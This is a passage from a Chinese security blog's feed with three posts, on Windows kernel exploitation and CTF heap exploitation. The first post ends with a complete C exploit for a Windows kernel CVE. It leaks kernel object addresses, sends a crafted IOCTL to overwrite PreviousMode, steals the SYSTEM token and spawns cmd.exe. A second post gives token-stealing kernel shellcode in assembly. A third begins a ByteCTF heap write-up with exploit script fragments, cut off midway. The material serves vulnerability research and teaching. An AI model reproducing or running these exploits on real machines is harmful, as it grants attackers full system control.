function_">NTSTATUS</span><span class="params">(__stdcall* _NtCreateFile)</span><span class="params">(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG)</span>;</span><br><span class="line">_NtCreateFile pNtCreateFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(__stdcall* _NtDeviceIoControlFile)</span><span class="params">(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG)</span>;</span><br><span class="line">_NtDeviceIoControlFile pNtDeviceIoControlFile;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">NtLoad</span><span class="params">()</span> &#123;</span><br><span class="line">HMODULE hModule = GetModuleHandle(<span class="string">L&quot;ntdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hModule != <span class="number">0</span>) &#123;</span><br><span class="line">pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(hModule, <span class="string">&quot;NtWriteVirtualMemory&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pNtWriteVirtualMemory)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] NtWriteVirtualMemory not loaded\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(hModule, <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pNtQuerySystemInformation)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] NtQuerySystemInformation not loaded\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(hModule, <span class="string">&quot;RtlInitUnicodeString&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pRtlInitUnicodeString)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] RtlInitUnicodeString not loaded\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pNtFsControlFile = (_NtFsControlFile)GetProcAddress(hModule, <span class="string">&quot;NtFsControlFile&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pNtFsControlFile)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] NtFsControlFile not loaded\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pNtCreateFile = (_NtCreateFile)GetProcAddress(hModule, <span class="string">&quot;NtCreateFile&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pNtCreateFile)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] NtCreateFile not loaded\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pNtDeviceIoControlFile = (_NtDeviceIoControlFile)GetProcAddress(hModule, <span class="string">&quot;NtDeviceIoControlFile&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pNtDeviceIoControlFile)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] NtDeviceIoControlFile not loaded\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] NTDLL not loaded\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">GetObjPtr</span><span class="params">(_Out_ PULONG64 ppObjAddr, _In_ ULONG ulPid, _In_ HANDLE handle)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> Ret = <span class="number">-1</span>;</span><br><span class="line">PSYSTEM_HANDLE_INFORMATION pHandleInfo = <span class="number">0</span>;</span><br><span class="line">ULONG ulBytes = <span class="number">0</span>;</span><br><span class="line">NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((Status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, pHandleInfo, ulBytes, &amp;ulBytes)) == <span class="number">0xC0000004</span>L)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pHandleInfo != <span class="literal">NULL</span>)</span><br><span class="line">pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, (<span class="type">size_t</span>)<span class="number">2</span> * ulBytes);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (<span class="type">size_t</span>)<span class="number">2</span> * ulBytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Status != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">Ret = Status;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; pHandleInfo-&gt;NumberOfHandles; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((pHandleInfo-&gt;Handles[i].UniqueProcessId == ulPid) &amp;&amp; (pHandleInfo-&gt;Handles[i].HandleValue == (<span class="type">unsigned</span> <span class="type">short</span>)handle))</span><br><span class="line">&#123;</span><br><span class="line">*ppObjAddr = (ULONG64)pHandleInfo-&gt;Handles[i].Object;</span><br><span class="line">Ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Write64</span><span class="params">(_In_ <span class="type">uintptr_t</span>* Dst, _In_ <span class="type">uintptr_t</span>* Src, _In_ <span class="type">size_t</span> Size)</span></span><br><span class="line">&#123;</span><br><span class="line">NTSTATUS Status = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> cbNumOfBytesWrite = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">Status = pNtWriteVirtualMemory(GetCurrentProcess(), Dst, Src, Size, &amp;cbNumOfBytesWrite);</span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(Status)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] NtWriteVirtualMemory failed with status = %x\n&quot;</span>, Status);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Exploit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">UNICODE_STRING  objectName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">OBJECT_ATTRIBUTES objectAttr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">IO_STATUS_BLOCK iosb = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">HANDLE handle;</span><br><span class="line">NTSTATUS status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> Sysproc = <span class="number">0</span>;</span><br><span class="line"><span class="type">uintptr_t</span> Curproc = <span class="number">0</span>;</span><br><span class="line"><span class="type">uintptr_t</span> Curthread = <span class="number">0</span>;</span><br><span class="line"><span class="type">uintptr_t</span> Token = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">HANDLE hCurproc = <span class="number">0</span>;</span><br><span class="line">HANDLE hThread = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint32_t</span> Ret = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint8_t</span> mode = UserMode;</span><br><span class="line">LARGE_INTEGER offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">//pRtlInitUnicodeString(&amp;objectName, L&quot;\\Device\\Mup\\;Csc\\.\\.&quot;);</span></span><br><span class="line">pRtlInitUnicodeString(&amp;objectName, <span class="string">L&quot;\\Device\\n0000b&quot;</span>);</span><br><span class="line">InitializeObjectAttributes(&amp;objectAttr, &amp;objectName, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">status = pNtCreateFile(&amp;handle, SYNCHRONIZE, &amp;objectAttr, &amp;iosb, <span class="literal">NULL</span>, FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>, FILE_OPEN_IF, FILE_CREATE_TREE_CONNECTION, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] NtCreateFile failed with status = %x\n&quot;</span>, status);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Ret = GetObjPtr(&amp;Sysproc, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] System EPROCESS address = %llx\n&quot;</span>, Sysproc);</span><br><span class="line"></span><br><span class="line">hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());</span><br><span class="line"><span class="keyword">if</span> (hThread != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">Ret = GetObjPtr(&amp;Curthread, GetCurrentProcessId(), hThread);</span><br><span class="line"><span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Current THREAD address = %llx\n&quot;</span>, Curthread);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hCurproc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, GetCurrentProcessId());</span><br><span class="line"><span class="keyword">if</span> (hCurproc != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">Ret = GetObjPtr(&amp;Curproc, GetCurrentProcessId(), hCurproc);</span><br><span class="line"><span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Current EPROCESS address = %llx\n&quot;</span>, Curproc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//DbgBreak();</span></span><br><span class="line"><span class="comment">// ---------------------------------------------------------------------------------</span></span><br><span class="line"><span class="type">char</span>* write_to = (<span class="type">char</span>*)(Curthread + KTHREAD_PREVIOUS_MODE_OFFSET);</span><br><span class="line"></span><br><span class="line"><span class="comment">//status = pNtFsControlFile(handle, NULL, NULL, NULL, &amp;iosb, CSC_DEV_FCB_XXX_CONTROL_FILE,</span></span><br><span class="line"><span class="comment">///*Vuln arg*/ (void*)(Curthread + KTHREAD_PREVIOUS_MODE_OFFSET-0x18), 0, NULL, 0);</span></span><br><span class="line"><span class="comment">//__debugbreak();</span></span><br><span class="line">offset.QuadPart = <span class="number">0x223450</span>;</span><br><span class="line"><span class="keyword">if</span> (!SetFilePointerEx(handle, offset, <span class="literal">NULL</span>, FILE_BEGIN)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] SetFilePointerEx failed with error %d\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD bytesReturned;</span><br><span class="line"><span class="comment">//DebugBreak();</span></span><br><span class="line"><span class="comment">//SendIoctl(handle, NULL, &amp;write_to, 0x1);</span></span><br><span class="line">__int64 buffer[<span class="number">2</span>];</span><br><span class="line">buffer[<span class="number">0</span>] = (Curthread + KTHREAD_PREVIOUS_MODE_OFFSET);</span><br><span class="line">BOOL result = DeviceIoControl(</span><br><span class="line">handle,</span><br><span class="line"><span class="number">0x223450</span>,</span><br><span class="line">buffer,</span><br><span class="line"><span class="number">0x8</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">&amp;bytesReturned,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//BOOL result = ReadFile(handle,buffer,sizeof(buffer), &amp;bytesReturned, NULL);</span></span><br><span class="line"><span class="keyword">if</span> (!result) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] Fail ioctl!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//----------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">//if (!NT_SUCCESS(status))</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//printf(&quot;[-] NtFsControlFile failed with status = %x\n&quot;, status);</span></span><br><span class="line"><span class="comment">//return status;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//printf(&quot;[!] Leveraging DKOM to achieve LPE\n&quot;);</span></span><br><span class="line"><span class="comment">//printf(&quot;[!] Calling Write64 wrapper to overwrite current EPROCESS-&gt;Token\n&quot;);</span></span><br><span class="line"></span><br><span class="line">Write64(Curproc + EPROCESS_TOKEN_OFFSET, Sysproc + EPROCESS_TOKEN_OFFSET, <span class="number">0x8</span>);</span><br><span class="line"></span><br><span class="line">Write64(Curthread + KTHREAD_PREVIOUS_MODE_OFFSET, &amp;mode, <span class="number">0x1</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (NtLoad()) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">NTSTATUS status = Exploit();</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/success_bsod.png" alt="success_bsod.png"></p><h1>总结</h1><p>年轻人的第一个Windows内核CVE（也是第一个CVE）复现，即便是这种生产环境高危的漏洞，本质逻辑也就是那样。只是在发现读写原语（read/write primitive）利用点的区别，提权路径也就是那些了，最后都得偷token，linux都得commit_cred。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;参考资料：&lt;a href=&quot;https://www.youtube.com/watch?v=nauAlHXrkIk&quot;&gt;https://www.youtube.com/watch?v=nauAlHXrkIk&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="Windows" scheme="https://zjw1nd.github.io/tags/Windows/"/>
    
    <category term="CVE" scheme="https://zjw1nd.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>现代内核安全机制——以Windows 11的kernel pwn为例</title>
    <link href="https://zjw1nd.github.io/2024/10/06/%E7%8E%B0%E4%BB%A3%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E4%BB%A5Windows-11%E7%9A%84kernel-pwn%E4%B8%BA%E4%BE%8B/"/>
    <id>https://zjw1nd.github.io/2024/10/06/%E7%8E%B0%E4%BB%A3%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E4%BB%A5Windows-11%E7%9A%84kernel-pwn%E4%B8%BA%E4%BE%8B/</id>
    <published>2024-10-06T08:31:08.000Z</published>
    <updated>2024-10-09T13:04:18.758Z</updated>
    
    <content type="html"><![CDATA[<h1>DEP</h1><p>全称Data Execution Prevention，看名字来讲就大概是说在数据区不允许执行。也就是经典的可写不可执行可执行的不可写的保护策略。我们能ret2sc执行我们自己的代码就是因为写入的数据和执行的代码没有隔离，dep就是为了阻止这一点。</p><h1>HVCI和VBS</h1><p>HVCI全称Hypervisor-protected Code Integrity（基于虚拟化保护的代码完整性检查），同样是将内存页可写与可执行分离，但对于DEP我们能够显式的通过一些手段让栈能够执行，通过修改某些标记？但hvci防止了这一点。修改内存页</p><h1>提权和恶搞</h1><p>我们Windows非常贴心的提供了API来泄露内核地址。这些函数相当一部分是“非公开函数”<br>不过说是非公开，只是我们无法通过<code>#include &lt;xxx.h&gt;</code>的方式进行引入而已。通过运行时加载或者extern声明的形式，我们可以从ntdll中获取这些函数，包括<code>NtQuerySystemInformation</code>这种能够无漏洞拿内核地址的以及<code>NtWriteVirtualMemory</code>这种任意地址写入的…Windows给的api太厉害以致于kaslr看起来似乎都没什么用了</p><p>Windows中，类似于task_struct，进程也是被结构体链表管理的。在内核中由一个EPROCESS管理每个进程。而除了pid，windows判断权限的方法主要是一个token。我们提权就是要从pid4（system权限固定进程，处理系统调用等）把token偷出来。否则内核是不让我们乱写的，用户态的写入会被大量的检查。</p><h1>内核ShellCode？</h1><blockquote><p>Windows的系统调用号是非公开的。</p></blockquote><p>shellcode也就是偷token了。即通过定位当前进程的ap链表项，通过循环遍历找到pid4的内核进程，然后偷取它的token复制到我们自己的进程，就有了系统权限。这是一段非常经典的windows内核shellcode：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[BITS 64]</span><br><span class="line">_start:</span><br><span class="line">    mov rax, [gs:0x188]     ;Cur thread(KTHREAD)</span><br><span class="line">    mov rax, [rax+0xb8]     ;Cur process(EPROCESS)</span><br><span class="line">    mov rbx, rax            ;Copy</span><br><span class="line">__loop:</span><br><span class="line">    mov rbx, [rbx + 0x448]  ;ActiveProcessLinks</span><br><span class="line">    sub rbx, 0x2e8          ;Go back to cur process (EPROCESS)</span><br><span class="line">    mov rcx, [rbx + 0x440]  ;UniqueProcessID(PID)</span><br><span class="line">    cmp rcx, 4              ;is System?</span><br><span class="line">    jnz __loop</span><br><span class="line">    mov rcx, [rbx + 0x4b8]  ;Token is at offset _EPROCESS + 0x4b8</span><br><span class="line">    and cl, 0xf0            ;Clear out _EX_FAST_REF RefCnt</span><br><span class="line">    mov [rax + 0x4b8], rcx  ;copy 2 cur</span><br><span class="line">    xor rax, rax            ;STATUS_SUCCESS</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;DEP&lt;/h1&gt;
&lt;p&gt;全称Data Execution Prevention，看名字来讲就大概是说在数据区不允许执行。也就是经典的可写不可执行可执行的不可写的保护策略。我们能ret2sc执行我们自己的代码就是因为写入的数据和执行的代码没有隔离，dep就是为了阻止这一点。</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="Windows" scheme="https://zjw1nd.github.io/tags/Windows/"/>
    
    <category term="kernel" scheme="https://zjw1nd.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2024——ezheap</title>
    <link href="https://zjw1nd.github.io/2024/09/25/ByteCTF2024%E2%80%94%E2%80%94ezheap/"/>
    <id>https://zjw1nd.github.io/2024/09/25/ByteCTF2024%E2%80%94%E2%80%94ezheap/</id>
    <published>2024-09-24T16:57:28.000Z</published>
    <updated>2024-09-26T01:21:29.160Z</updated>
    
    <content type="html"><![CDATA[<p>这道题目比赛的时候思路卡住了，有两个其实很简单的点都没想到，不然初赛战队就能第三名拿钱了。</p><h1>题目分析</h1><p>GLIBC2.27，符号表都没去，就是add，edit，show，delete，exit。malloc返回的指针存在数组里。漏洞明显的不能再明显了，add申请一个size，edit没检查，任意溢出。然后show就是printf %s的泄露，exit调用了libc中的exit函数。</p><p>但是这个free比较幽默，是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">freechunk</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r12d</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 temp; <span class="comment">// [rsp+Fh] [rbp-181h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 tempa; <span class="comment">// [rsp+Fh] [rbp-181h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-180h]</span></span><br><span class="line">  <span class="type">int</span> ia; <span class="comment">// [rsp+10h] [rbp-180h]</span></span><br><span class="line">  <span class="type">int</span> ib; <span class="comment">// [rsp+10h] [rbp-180h]</span></span><br><span class="line">  <span class="type">int</span> ic; <span class="comment">// [rsp+10h] [rbp-180h]</span></span><br><span class="line">  <span class="type">int</span> id; <span class="comment">// [rsp+10h] [rbp-180h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+14h] [rbp-17Ch]</span></span><br><span class="line">  <span class="type">int</span> ja; <span class="comment">// [rsp+14h] [rbp-17Ch]</span></span><br><span class="line">  <span class="type">size_t</span> index; <span class="comment">// [rsp+18h] [rbp-178h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 output[<span class="number">32</span>]; <span class="comment">// [rsp+30h] [rbp-160h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 input[<span class="number">32</span>]; <span class="comment">// [rsp+50h] [rbp-140h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 S[<span class="number">264</span>]; <span class="comment">// [rsp+70h] [rbp-120h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+178h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="type">unsigned</span> __int64)i &lt; <span class="number">0x20</span>; ++i )</span><br><span class="line">    input[i] = i;</span><br><span class="line">  <span class="keyword">for</span> ( ia = <span class="number">0</span>; ia &lt;= <span class="number">255</span>; ++ia )</span><br><span class="line">    S[ia] = ia;</span><br><span class="line">  <span class="keyword">for</span> ( ib = <span class="number">0</span>; ib &lt;= <span class="number">255</span>; ++ib )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = S[ib] + j;</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(<span class="string">&quot;secretkey&quot;</span>);</span><br><span class="line">    v2 = v0 + aSecretkey[ib % v1];</span><br><span class="line">    LODWORD(v1) = (<span class="type">unsigned</span> <span class="type">int</span>)((v0 + (<span class="type">unsigned</span> __int8)aSecretkey[ib % v1]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">    j = (<span class="type">unsigned</span> __int8)(v1 + v2) - (_DWORD)v1;</span><br><span class="line">    temp = S[ib];</span><br><span class="line">    S[ib] = S[j];</span><br><span class="line">    S[j] = temp;</span><br><span class="line">  &#125;</span><br><span class="line">  ic = <span class="number">0</span>;</span><br><span class="line">  ja = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( index = <span class="number">0LL</span>; index &lt; <span class="number">0x20</span>; ++index )</span><br><span class="line">  &#123;</span><br><span class="line">    ic = (ic + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    ja = (ja + S[ic]) % <span class="number">256</span>;</span><br><span class="line">    tempa = S[ic];</span><br><span class="line">    S[ic] = S[ja];</span><br><span class="line">    S[ja] = tempa;</span><br><span class="line">    output[index] = S[(<span class="type">unsigned</span> __int8)(S[ic] + S[ja])] ^ input[index];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( id = <span class="number">0</span>; (<span class="type">unsigned</span> __int64)id &lt; <span class="number">0x20</span>; ++id )</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>稍微看一下就能发现，这个free乱搞了半天完全是自己忙活自己的，所有内容都是函数的局部变量，input都是自己初始化的，问了copilot说这是个rc4的加密算法，不过没什么用就是了。再观察一下就能发现程序根本就没链接到free，没有free的符号。调的库就puts，这里面的strlen还有malloc。</p><p>除了没有free以外，edit有个很有意思的地方。在edit之前，会检查这个chunk指针的地址。定位一下可以知道，这两个地址分别检查了mallochook以及前面的0x3000和linkmap中的两个&quot;exithook&quot;，即在exit的时候会触发的两个函数指针。（发现mallochook不能用就第一时间上网找利用方式就看到了这个，结果也ban了…）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __cdecl <span class="title function_">checksanbox</span><span class="params">(<span class="type">char</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ptr &gt;= (<span class="type">char</span> *)&amp;<span class="built_in">puts</span> + <span class="number">0x368270</span> &amp;&amp; ptr &lt; (<span class="type">char</span> *)&amp;<span class="built_in">puts</span> + <span class="number">0x36B270</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> ptr &gt; (<span class="type">char</span> *)&amp;<span class="built_in">puts</span> + <span class="number">0x5995B2</span> || ptr &lt; (<span class="type">char</span> *)&amp;<span class="built_in">puts</span> + <span class="number">0x599596</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里有个伏笔↑，后面会说</p></blockquote><h1>没有free我们怎么做？</h1><p>首先没有free一定是houseoforange的前半步了，glibc2.27 ban了House of Orange的后半段，但不影响拿free块。同时在unsortedbin之后再切割就能拿libc。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">evil_size=<span class="number">0xd91</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(evil_size))</span><br><span class="line">add(<span class="number">0xe08</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 2 size for free: 0xd71</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span 